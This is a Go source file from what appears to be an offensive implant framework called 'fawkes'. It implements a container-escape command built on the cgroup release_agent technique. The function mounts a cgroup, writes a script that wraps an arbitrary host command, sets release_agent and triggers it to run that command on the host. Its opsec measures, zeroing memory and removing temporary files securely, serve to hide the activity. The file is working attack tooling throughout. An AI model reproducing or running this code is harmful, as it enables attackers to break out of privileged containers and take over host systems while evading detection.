//go:build linux

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

// escapeCgroupNotify uses the cgroup release_agent for host command execution (requires privileged).
func escapeCgroupNotify(command string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}

	var sb strings.Builder
	sb.WriteString("[*] Attempting cgroup release_agent escape\n")

	// Create a temp cgroup
	cgroupDir, err := os.MkdirTemp("", "")
	if err != nil {
		return fmt.Sprintf("Failed to create cgroup dir: %v", err), "error"
	}

	// Mount a cgroup hierarchy
	if err := syscall.Mount("cgroup", cgroupDir, "cgroup", 0, "rdma"); err != nil {
		// Try memory controller instead
		if err := syscall.Mount("cgroup", cgroupDir, "cgroup", 0, "memory"); err != nil {
			os.Remove(cgroupDir)
			return fmt.Sprintf("Failed to mount cgroup: %v (need privileged container)", err), "error"
		}
	}
	sb.WriteString("[+] Cgroup mounted\n")

	// Create child cgroup
	childDir := filepath.Join(cgroupDir, "x")
	if err := os.MkdirAll(childDir, 0o755); err != nil {
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to create child cgroup: %v", err), "error"
	}

	// Get the container's path on the host filesystem
	hostPath := ""
	if data, err := os.ReadFile("/proc/self/cgroup"); err == nil {
		// Extract the overlay upperdir or similar
		for _, line := range strings.Split(string(data), "\n") {
			parts := strings.SplitN(line, ":", 3)
			if len(parts) == 3 && parts[2] != "/" {
				hostPath = parts[2]
				break
			}
		}
		structs.ZeroBytes(data) // opsec: clear cgroup info (may reveal container paths)
	}

	// Write the release_agent path
	// We need to know our path on the host — write a script that's accessible from host
	scriptFile, err := os.CreateTemp("", "")
	if err != nil {
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to create script temp file: %v", err), "error"
	}
	scriptPath := scriptFile.Name()
	scriptFile.Close()

	outputFile, err := os.CreateTemp("", "")
	if err != nil {
		secureRemove(scriptPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to create output temp file: %v", err), "error"
	}
	outputPath := outputFile.Name()
	outputFile.Close()

	// Write script
	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
		secureRemove(outputPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to write escape script: %v", err), "error"
	}

	// The release_agent needs the full host path to the script
	// This is the tricky part — we need to figure out our overlay path on the host
	releaseAgentScript := scriptPath
	if hostPath != "" {
		// For overlay containers, the script is at the merged path
		sb.WriteString(fmt.Sprintf("[*] Container cgroup path: %s\n", hostPath))
	}

	// Set release_agent
	releaseAgentPath := filepath.Join(cgroupDir, "release_agent")
	if err := os.WriteFile(releaseAgentPath, []byte(releaseAgentScript), 0o644); err != nil {
		secureRemove(scriptPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to set release_agent: %v", err), "error"
	}
	sb.WriteString("[+] release_agent set\n")

	// Enable notify_on_release
	notifyPath := filepath.Join(childDir, "notify_on_release")
	if err := os.WriteFile(notifyPath, []byte("1"), 0o644); err != nil {
		secureRemove(scriptPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to enable notify_on_release: %v", err), "error"
	}

	// Trigger by writing our PID to child cgroup then removing it
	cgroupProcs := filepath.Join(childDir, "cgroup.procs")
	if err := os.WriteFile(cgroupProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to child cgroup.procs: %v\n", err))
	}

	// Move back to parent and remove child to trigger release
	parentProcs := filepath.Join(cgroupDir, "cgroup.procs")
	if err := os.WriteFile(parentProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to parent cgroup.procs: %v\n", err))
	}
	os.Remove(childDir)

	sb.WriteString("[+] Triggered release_agent\n")

	// Check for output
	if data, err := os.ReadFile(outputPath); err == nil {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(data))
		structs.ZeroBytes(data) // opsec: clear arbitrary command output
	} else {
		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
	}
	secureRemove(outputPath)

	// Cleanup
	secureRemove(scriptPath)
	_ = syscall.Unmount(cgroupDir, 0)
	os.RemoveAll(cgroupDir)

	return sb.String(), "success"
}
